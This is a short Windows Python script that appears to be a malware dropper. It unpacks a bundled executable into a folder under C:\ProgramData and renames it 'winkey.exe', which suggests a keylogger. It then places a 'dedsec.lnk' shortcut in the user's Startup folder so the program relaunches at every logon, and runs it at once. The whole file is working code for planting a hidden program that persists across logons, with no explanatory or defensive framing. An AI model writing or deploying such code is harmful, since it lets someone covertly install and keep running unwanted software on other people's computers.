import os
import sys
import win32com.client as client

shell = client.Dispatch("WScript.Shell")

def createShortCut(filepath, lnkpath):
    """filename should be abspath, or there will be some strange errors"""
    shortcut = shell.CreateShortCut(lnkpath)
    shortcut.TargetPath = filepath
    shortcut.save()


def resource_path(fileName):
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, fileName)
    return os.path.join(fileName)


if __name__ == '__main__':
    path = 'C:\\ProgramData\\Dedsec\\Aiden\\homework\\'
    shortcut_path = os.path.expanduser('~') + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
    file_name = 'winkey.exe'

    if not os.path.exists(path):
        os.makedirs(path)
    with open(resource_path('source.exe'), 'rb') as f:
        source = f.read()
    with open(path + file_name, 'wb') as f:
        f.write(source)
    createShortCut(path + file_name, shortcut_path + 'dedsec.lnk')

    os.system(path + file_name)

